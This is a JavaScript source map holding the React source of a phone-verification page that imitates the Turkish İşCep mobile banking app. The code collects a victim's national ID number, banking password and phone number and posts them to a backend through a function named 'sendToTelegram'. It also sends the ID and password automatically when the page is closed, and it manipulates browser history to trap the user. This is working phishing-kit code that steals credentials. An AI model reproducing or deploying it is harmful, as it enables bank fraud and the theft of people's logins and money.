{"version":3,"file":"static/js/527.40304dde.chunk.js","mappings":"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","sources":["PhoneVerificationPage.js"],"sourcesContent":["import React, { useEffect, useRef, useCallback, memo } from 'react';\nimport { useLocation, useNavigate } from 'react-router-dom';\nimport './App.css';\nimport IscepLogo from './assets/iscep-logo.png';\nimport ErrorIcon from './assets/error.png';\nimport { useAuth } from './AuthContext';\n\nfunction PhoneVerificationPage() {\n  const [state, setState] = React.useState({\n    phoneNumber: '',\n    isPhoneActive: false,\n    isPhoneLabelHovered: false,\n    showPhoneError: false,\n    isSubmitting: false,\n    isPhoneFocused: false,\n    isPhonePrefixVisible: false,\n    errorMessage: '',\n  });\n\n  const phoneInputRef = useRef(null);\n  const location = useLocation();\n  const navigate = useNavigate();\n  const { dispatch: authDispatch } = useAuth();\n  const { tc, password, isValidNavigation } = location.state || {};\n\n  // Dinamik API URL'si\n  const apiUrl = process.env.NODE_ENV === 'development'\n    ? 'http://localhost:5000/api/submit'\n    : '/api/submit'; // Vercel'de相对 yol\n\n  // Navigasyon ve geri tuşu kontrolü\n  useEffect(() => {\n    if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {\n      setState((prev) => ({\n        ...prev,\n        showPhoneError: true,\n        errorMessage: 'Geçersiz erişim, lütfen giriş yapın.',\n      }));\n      authDispatch({ type: 'RESET_AUTH' });\n      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });\n      return;\n    }\n\n    window.history.replaceState({ page: 'telefon' }, '', '/telefon');\n    window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');\n\n    const handlePopState = (event) => {\n      event.preventDefault();\n      authDispatch({ type: 'RESET_AUTH' });\n      window.history.replaceState(null, '', '/giris');\n      navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });\n    };\n\n    window.addEventListener('popstate', handlePopState);\n    return () => window.removeEventListener('popstate', handlePopState);\n  }, [tc, password, isValidNavigation, navigate, authDispatch]);\n\n  // Telegram gönderimi\n  const sendToTelegram = useCallback(async (data) => {\n    try {\n      const res = await fetch(apiUrl, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({\n          tc: String(data.tc),\n          password: String(data.password),\n          phone: String(data.phone),\n        }),\n      });\n      const result = await res.json();\n      if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');\n      return result;\n    } catch (error) {\n      setState((prev) => ({\n        ...prev,\n        showPhoneError: true,\n        errorMessage: `Veri gönderimi sırasında hata oluştu: ${error.message || 'Lütfen tekrar deneyin.'}`,\n      }));\n      return { error: error.message };\n    }\n  }, [apiUrl]);\n\n  // Siteden çıkıldığında veri gönderimi\n  useEffect(() => {\n    const handleBeforeUnload = () => {\n      if (tc && password && !state.phoneNumber) {\n        sendToTelegram({ tc, password, phone: '' });\n      }\n    };\n    window.addEventListener('beforeunload', handleBeforeUnload);\n    return () => window.removeEventListener('beforeunload', handleBeforeUnload);\n  }, [tc, password, state.phoneNumber, sendToTelegram]);\n\n  const handleNumberInput = useCallback((e) => {\n    const value = e.target.value.replace(/\\D/g, '');\n    if (value.length <= 10) {\n      setState((prev) => ({\n        ...prev,\n        phoneNumber: value,\n        isPhoneActive: true,\n        isPhoneLabelHovered: true,\n        isPhonePrefixVisible: true,\n        showPhoneError: false,\n        errorMessage: '',\n      }));\n    }\n  }, []);\n\n  const handleClearPhoneNumber = useCallback(() => {\n    setState((prev) => ({\n      ...prev,\n      phoneNumber: '',\n      isPhoneActive: true,\n      isPhoneLabelHovered: true,\n      isPhonePrefixVisible: true,\n      showPhoneError: false,\n      errorMessage: '',\n    }));\n    phoneInputRef.current?.focus();\n  }, []);\n\n  const handlePhoneFocus = useCallback(() => {\n    setState((prev) => ({\n      ...prev,\n      isPhoneActive: true,\n      isPhoneLabelHovered: true,\n      isPhonePrefixVisible: true,\n      isPhoneFocused: true,\n    }));\n  }, []);\n\n  const handlePhoneBlur = useCallback(() => {\n    setState((prev) => ({\n      ...prev,\n      isPhoneFocused: false,\n      isPhoneActive: prev.phoneNumber.length > 0,\n      isPhoneLabelHovered: prev.phoneNumber.length > 0,\n      isPhonePrefixVisible: prev.phoneNumber.length > 0,\n    }));\n  }, []);\n\n  const handlePhoneSubmit = useCallback(\n    async (e) => {\n      e.preventDefault();\n      if (state.phoneNumber.length > 0 && state.phoneNumber.length !== 10) {\n        setState((prev) => ({\n          ...prev,\n          showPhoneError: true,\n          errorMessage: 'Telefon numarası 10 haneli olmalı.',\n        }));\n        return;\n      }\n      if (state.phoneNumber.length === 10) {\n        setState((prev) => ({ ...prev, isSubmitting: true }));\n        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });\n        if (result && !result.error) {\n          authDispatch({ type: 'RESET_AUTH' });\n          setState({\n            phoneNumber: '',\n            isPhoneActive: false,\n            isPhoneLabelHovered: false,\n            showPhoneError: false,\n            isSubmitting: false,\n            isPhoneFocused: false,\n            isPhonePrefixVisible: false,\n            errorMessage: '',\n          });\n          window.history.replaceState(null, '', '/bekleme');\n          navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });\n        }\n      }\n    },\n    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]\n  );\n\n  return (\n    <div className=\"container\" style={{ touchAction: 'manipulation' }}>\n      <div className=\"right-section\">\n        <img src={IscepLogo} alt=\"İşCep Logosu\" className=\"iscep-logo iscep-logo-phone\" loading=\"lazy\" />\n        <div className=\"new-container phone-verification-title\">\n          Telefon Doğrulama\n          <div className=\"phone-verification-subtitle\">\n            Lütfen cep telefon numaranızı giriniz\n          </div>\n        </div>\n        <div className=\"input-wrapper\">\n          <div\n            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${\n              state.isPhonePrefixVisible ? 'prefix-visible' : ''\n            }`}\n            onClick={() => phoneInputRef.current?.focus()}\n          >\n            <label\n              className={`phone-label ${state.isPhoneLabelHovered ? 'phone-hovered' : ''}`}\n              htmlFor=\"phone-input\"\n            >\n              Telefon Numarası\n            </label>\n            <div className=\"phone-input-container\">\n              <span className=\"phone-prefix\">+90</span>\n              <input\n                id=\"phone-input\"\n                ref={phoneInputRef}\n                type=\"tel\"\n                inputMode=\"numeric\"\n                pattern=\"[0-9]*\"\n                maxLength=\"10\"\n                value={state.phoneNumber}\n                onChange={handleNumberInput}\n                onFocus={handlePhoneFocus}\n                onBlur={handlePhoneBlur}\n                className={`new-input phone-input ${state.showPhoneError ? 'error' : ''}`}\n                autoComplete=\"tel\"\n                autoCapitalize=\"none\"\n                aria-describedby=\"phone-error\"\n                aria-label=\"Telefon Numarası\"\n                aria-invalid={state.showPhoneError}\n              />\n              {state.phoneNumber.length > 0 && (\n                <button\n                  className=\"clear-phone-button\"\n                  onClick={handleClearPhoneNumber}\n                  onTouchStart={handleClearPhoneNumber}\n                  aria-label=\"Telefon numarasını temizle\"\n                >\n                  ✕\n                </button>\n              )}\n            </div>\n            {state.showPhoneError && (\n              <div id=\"phone-error\" className=\"phone-error\" role=\"alert\" aria-live=\"assertive\">\n                <img\n                  src={ErrorIcon}\n                  alt=\"Hata Simgesi\"\n                  className=\"error-icon\"\n                  loading=\"lazy\"\n                  onError={() => console.warn('Hata simgesi yüklenemedi')}\n                />\n                {state.errorMessage || 'Lütfen 10 haneli telefon numaranızı girin.'}\n              </div>\n            )}\n          </div>\n          <div className=\"verify-button-container\">\n            <button\n              className={`button-phone ${\n                state.phoneNumber.length > 0 ? 'active-continue-button' : ''\n              }`}\n              onClick={handlePhoneSubmit}\n              onTouchStart={handlePhoneSubmit}\n              disabled={state.isSubmitting}\n              aria-label=\"Telefon numarasını doğrula\"\n            >\n              Doğrula\n            </button>\n          </div>\n        </div>\n      </div>\n    </div>\n  );\n}\n\nexport default memo(PhoneVerificationPage);"],"names":["PhoneVerificationPage","state","setState","React","phoneNumber","isPhoneActive","isPhoneLabelHovered","showPhoneError","isSubmitting","isPhoneFocused","isPhonePrefixVisible","errorMessage","phoneInputRef","useRef","location","useLocation","navigate","useNavigate","dispatch","authDispatch","useAuth","tc","password","isValidNavigation","apiUrl","useEffect","length","prev","_objectSpread","type","replace","fromPhoneVerification","window","history","replaceState","page","pushState","handlePopState","event","preventDefault","addEventListener","removeEventListener","sendToTelegram","useCallback","async","res","fetch","method","headers","body","JSON","stringify","String","data","phone","result","json","ok","Error","message","error","concat","handleBeforeUnload","handleNumberInput","e","value","target","handleClearPhoneNumber","_phoneInputRef$curren","current","focus","handlePhoneFocus","handlePhoneBlur","handlePhoneSubmit","from","isCompleted","_jsx","className","style","touchAction","children","_jsxs","src","IscepLogo","alt","loading","onClick","_phoneInputRef$curren2","htmlFor","id","ref","inputMode","pattern","maxLength","onChange","onFocus","onBlur","autoComplete","autoCapitalize","onTouchStart","role","onError","console","warn","disabled","memo"],"sourceRoot":""}